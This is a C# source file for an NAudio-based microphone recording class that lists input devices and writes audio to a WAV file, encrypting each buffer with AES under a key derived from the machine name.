using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NAudio.Wave;

namespace Neme.Utils
{
    internal class AudioCapture
    {
        private WaveInEvent waveIn;
        private WaveFileWriter writer;

        public AudioCapture()
        {
            waveIn = new WaveInEvent
            {
                DeviceNumber = 0,
                WaveFormat = new WaveFormat(44100, 1)
            };

            waveIn.DataAvailable += OnDataAvailable;
        }
        public void StartRecording(string filePath)
        {
            try
            {
                writer = new WaveFileWriter(filePath, waveIn.WaveFormat);
                waveIn.StartRecording();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting recording: {ex.Message}");
            }
        }

        public void StopRecording()
        {
            try
            {
                waveIn.StopRecording();
                writer?.Dispose();
                writer = null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stopping recording: {ex.Message}");
            }
        }

        public List<string> GetAvailableDevices()
        {
            List<string> deviceList = new List<string>();
            for (int i = 0; i < WaveIn.DeviceCount; i++)
            {
                var deviceInfo = WaveIn.GetCapabilities(i);
                deviceList.Add(deviceInfo.ProductName);
            }
            return deviceList;
        }

        public void SetDevice(int deviceNumber)
        {
            waveIn.DeviceNumber = deviceNumber;
        }

        private void OnDataAvailable(object sender, WaveInEventArgs e)
        {
            if (writer != null)
            {
                // Encrypt the audio data
                string systemName = Environment.MachineName;
                AesEncryption aes = new AesEncryption(systemName);
                string encryptedData = aes.Encrypt(Convert.ToBase64String(e.Buffer));
                byte[] encryptedBytes = Convert.FromBase64String(encryptedData);

                writer.Write(encryptedBytes, 0, encryptedBytes.Length);
            }
        }


    }
}
